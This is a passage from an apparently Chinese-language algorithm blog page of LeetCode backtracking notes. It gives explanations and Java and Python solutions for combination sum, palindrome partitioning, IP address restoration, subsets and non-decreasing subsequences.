class="title function_">backTracking</span><span class="params">(String digits, String[] numString, <span class="type">int</span> num)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(num == digits.length())&#123;</span><br><span class="line">            list.add(temp.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> numString[digits.charAt(num) - <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++)&#123;</span><br><span class="line">            temp.append(str.charAt(i));</span><br><span class="line">            backTracking(digits, numString, num+<span class="number">1</span>);</span><br><span class="line">            temp.deleteCharAt(temp.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title="39. 组合总和"></a>39. 组合总和</h2><p>给你一个 无重复元素 的整数数组 candidates 和一个目标整数 target ，找出 candidates 中可以使数字和为目标数 target 的 所有 不同组合 ，并以列表形式返回。你可以按 任意顺序 返回这些组合。<br>candidates 中的 同一个 数字可以 无限制重复被选取 。如果至少一个数字的被选数量不同，则两种组合是不同的。<br>对于给定的输入，保证和为 target 的不同组合数少于 150 个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtracking(res, <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(), candidates, target, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; res, List&lt;Integer&gt; path, <span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> sum, <span class="type">int</span> idx)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=idx; i &lt; candidates.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target) <span class="keyword">break</span>;</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backtracking(res, path, candidates, target, sum+candidates[i], i);  <span class="comment">// 这道题的关键点在这里 i不用加1，所以可以重复选择i</span></span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="40-组合总和II"><a href="#40-组合总和II" class="headerlink" title="40.组合总和II"></a>40.组合总和II</h2><p>给定一个数组 candidates 和一个目标数 target ，找出 candidates 中所有可以使数字和为 target 的组合。</p><p>candidates 中的每个数字在每个组合中只能使用一次。</p><p>说明： 所有数字（包括目标数）都是正整数。解集不能包含重复的组合。</p><p>示例 1:<br>输入: candidates &#x3D; <code>[10,1,2,7,6,1,5]</code>, target &#x3D; 8,<br>所求解集为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  [1, 7],</span><br><span class="line">  [1, 2, 5],</span><br><span class="line">  [2, 6],</span><br><span class="line">  [1, 1, 6]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这道题目和39.组合总和 (opens new window)如下区别：<br>本题candidates 中的每个数字在每个组合中只能使用一次。<br>本题数组candidates的元素是有重复的，而39.组合总和 (opens new window)是无重复元素的数组candidates</p><p>我们要去重的是同一树层上的“使用过”，同一树枝上的都是一个组合里的元素，不用去重。<br>为了理解去重我们来举一个例子，candidates &#x3D; [1, 1, 2], target &#x3D; 3，（方便起见candidates已经排序了）<br>强调一下，树层去重的话，需要对数组排序！</p><p>如何判断同一树层上元素（相同的元素）是否使用过了呢。<br>如果candidates[i] &#x3D;&#x3D; candidates[i - 1] 并且 used[i - 1] &#x3D;&#x3D; false，就说明：前一个树枝，使用了candidates[i - 1]，也就是说同一树层使用过candidates[i - 1]。<br><img src="/2024/11/29/algorithm/backtracking/image-3.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; ans = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">boolean</span>[] used;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        used = <span class="keyword">new</span> <span class="title class_">boolean</span>[candidates.length];</span><br><span class="line">        Arrays.fill(used, <span class="literal">false</span>);</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtracking(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> startIndex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">            ans.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sum + candidates[i] &gt; target)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>] &amp;&amp; !used[i-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            used[i] = <span class="literal">true</span>;</span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backtracking(candidates, target, i+<span class="number">1</span>);</span><br><span class="line">            used[i] = <span class="literal">false</span>;</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面这个是不使用used数组的版本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum2</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(candidates);</span><br><span class="line">        backtracking(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target, <span class="type">int</span> startIndex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(sum == target)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; candidates.length &amp;&amp; sum + candidates[i] &lt;= target; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; startIndex &amp;&amp; candidates[i] == candidates[i-<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.add(candidates[i]);</span><br><span class="line">            backtracking(candidates, target, i+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> path.getLast();</span><br><span class="line">            sum -= temp;</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="131-分割回文串"><a href="#131-分割回文串" class="headerlink" title="131. 分割回文串"></a>131. 分割回文串</h2><p>给你一个字符串 s，请你将 s 分割成一些子串，使每个子串都是 回文串 。返回 s 所有可能的分割方案。</p><p>示例 1：<br>输入：s &#x3D; “aab”<br>输出：[[“a”,”a”,”b”],[“aa”,”b”]]</p><p>示例 2：<br>输入：s &#x3D; “a”<br>输出：[[“a”]]<br><img src="/2024/11/29/algorithm/backtracking/image-4.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 基础版的代码</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(s, <span class="number">0</span>, [], result);</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, s, start_index, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> start_index == <span class="built_in">len</span>(s):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 单层递归逻辑</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_index, <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.is_palindrome(s, start_index, i):</span><br><span class="line">                path.append(s[start_index:i+<span class="number">1</span>])</span><br><span class="line">                <span class="variable language_">self</span>.backtracking(s, i+<span class="number">1</span>, path, result)</span><br><span class="line">                path.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_palindrome</span>(<span class="params">self, s:<span class="built_in">str</span>, start:<span class="built_in">int</span>, end:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        i:<span class="built_in">int</span> = start</span><br><span class="line">        j:<span class="built_in">int</span> = end</span><br><span class="line">        <span class="keyword">while</span> i&lt;j:</span><br><span class="line">            <span class="keyword">if</span> s[i] != s[j]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>上面的代码还存在一定的优化空间, 在于如何更高效的计算一个子字符串是否是回文字串。上述代码isPalindrome函数运用双指针的方法来判定对于一个字符串s, 给定起始下标和终止下标, 截取出的子字符串是否是回文字串。但是其中有一定的重复计算存在:<br>例如给定字符串”abcde”, 在已知”bcd”不是回文字串时, 不再需要去双指针操作”abcde”而可以直接判定它一定不是回文字串。<br>具体来说, 给定一个字符串s, 长度为n, 它成为回文字串的充分必要条件是s[0] &#x3D;&#x3D; s[n-1]且s[1:n-1]是回文字串。<br>大家如果熟悉动态规划这种算法的话, 我们可以高效地事先一次性计算出, 针对一个字符串s, 它的任何子串是否是回文字串, 然后在我们的回溯函数中直接查询即可, 省去了双指针移动判定这一步骤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        isPalindrome = [[<span class="literal">False</span>] * <span class="built_in">len</span>(s) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))] <span class="comment"># 初始化isPalindrome矩阵</span></span><br><span class="line">        <span class="variable language_">self</span>.computePalindrome(s, isPalindrome)</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(s, <span class="number">0</span>, [], result, isPalindrome)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, s, startIndex, path, result, isPalindrome</span>):</span><br><span class="line">        <span class="keyword">if</span> startIndex &gt;= <span class="built_in">len</span>(s):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> isPalindrome[startIndex][i]:</span><br><span class="line">                substring = s[startIndex:i+<span class="number">1</span>]</span><br><span class="line">                path.append(substring)</span><br><span class="line">                <span class="variable language_">self</span>.backtracking(s, i+<span class="number">1</span>, path, result, isPalindrome)</span><br><span class="line">                path.pop()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">computePalindrome</span>(<span class="params">self, s, isPalindrome</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>): <span class="comment"># # 需要倒序计算，保证在i行时，i+1行已经计算好了</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i, <span class="built_in">len</span>(s)):</span><br><span class="line">                <span class="keyword">if</span> j == i:</span><br><span class="line">                    isPalindrome[i][j] = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">elif</span> j - i == <span class="number">1</span>:</span><br><span class="line">                    isPalindrome[i][j] = (s[i] == s[j])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    isPalindrome[i][j] = (s[i] == s[j] <span class="keyword">and</span> isPalindrome[i+<span class="number">1</span>][j-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h2 id="93-复原-IP-地址"><a href="#93-复原-IP-地址" class="headerlink" title="93. 复原 IP 地址"></a>93. 复原 IP 地址</h2><p>有效 IP 地址 正好由四个整数（每个整数位于 0 到 255 之间组成，且不能含有前导 0），整数之间用 ‘.’ 分隔。</p><p>例如：”0.1.2.201” 和 “192.168.1.1” 是 有效 IP 地址，但是 “0.011.255.245”、”192.168.1.312” 和 “<a href="mailto:&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x40;&#x31;&#46;&#49;">&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x40;&#x31;&#46;&#49;</a>“ 是 无效 IP 地址。<br>给定一个只包含数字的字符串 s ，用以表示一个 IP 地址，返回所有可能的有效 IP 地址，这些地址可以通过在 s 中插入 ‘.’ 来形成。你 不能 重新排序或删除 s 中的任何数字。你可以按 任何 顺序返回答案。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">restoreIpAddresses</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(s, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, s, start_index, point_num, current, result</span>):</span><br><span class="line">        <span class="keyword">if</span> point_num == <span class="number">3</span>: <span class="comment"># 逗点数量为3时，分隔结束</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.is_valid(s, start_index, <span class="built_in">len</span>(s) - <span class="number">1</span>): <span class="comment"># 判断第四段子字符串是否合法</span></span><br><span class="line">                current += s[start_index:]</span><br><span class="line">                result.append(current)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_index, <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.is_valid(s, start_index, i):</span><br><span class="line">                sub = s[start_index:i+<span class="number">1</span>]</span><br><span class="line">                <span class="variable language_">self</span>.backtracking(s, i+<span class="number">1</span>, point_num+<span class="number">1</span>, current+sub+<span class="string">&#x27;.&#x27;</span>, result)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">self, s, start, end</span>):</span><br><span class="line">        <span class="keyword">if</span> start &gt; end:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> s[start] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> start != end:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> s[i].isdigit():</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            num = num * <span class="number">10</span> + <span class="built_in">int</span>(s[i])</span><br><span class="line">            <span class="keyword">if</span> num &gt; <span class="number">255</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="78-子集"><a href="#78-子集" class="headerlink" title="78. 子集"></a>78. 子集</h2><p>给你一个整数数组 nums ，数组中的元素 互不相同 。返回该数组所有可能的子集（幂集）。解集 不能 包含重复的子集。你可以按 任意顺序 返回解集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line">输入：nums = [1,2,3]</span><br><span class="line">输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：nums = [0]</span><br><span class="line">输出：[[],[0]]</span><br></pre></td></tr></table></figure><p>这道题主要就是要遍历所有的路径 而不需要减枝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        path = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, <span class="number">0</span>, path, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, startIndex, path, result</span>):</span><br><span class="line">        result.append(path[:])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):</span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, i+<span class="number">1</span>, path, result)</span><br><span class="line">            path.pop()</span><br></pre></td></tr></table></figure><h2 id="90-子集II"><a href="#90-子集II" class="headerlink" title="90.子集II"></a>90.子集II</h2><p>给定一个可能包含重复元素的整数数组 nums，返回该数组所有可能的子集（幂集）。<br>说明：解集不能包含重复的子集。</p><p>示例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,2,2]</span><br><span class="line">输出: [ [2], [1], [1,2,2], [2,2], [1,2], []]</span><br></pre></td></tr></table></figure><p>这道题目和78.子集 (opens new window)区别就是集合里有重复元素了，而且求取的子集要去重。<br><img src="/2024/11/29/algorithm/backtracking/image-5.png"></p><h2 id="491-非递减子序列"><a href="#491-非递减子序列" class="headerlink" title="491. 非递减子序列"></a>491. 非递减子序列</h2><p>给你一个整数数组 nums ，找出并返回所有该数组中不同的递增子序列，递增子序列中 至少有两个元素 。你可以按 任意顺序 返回答案。<br>数组中可能含有重复元素，如出现两个整数相等，也可以视作递增序列的一种特殊情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line">输入：nums = [4,6,7,7]</span><br><span class="line">输出：[[4,6],[4,6,7],[4,6,7,7],[4,7],[4,7,7],[6,7],[6,7,7],[7,7]]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：nums = [4,4,3,2,1]</span><br><span class="line">输出：[[4,4]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findSubsequences</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        result = []</span><br><span class="line">        path = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, <span class="number">0</span>, path, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, startIndex, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) &gt; <span class="number">1</span>:</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="comment"># 注意这里不要return 因为需要取叶子上的节点</span></span><br><span class="line"></span><br><span class="line">        uset = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> (path <span class="keyword">and</span> nums[i] &lt; path[-<span class="number">1</span>]) <span class="keyword">or</span> nums[i] <span class="keyword">in</span> uset:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            uset.add(nums[i])</span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">            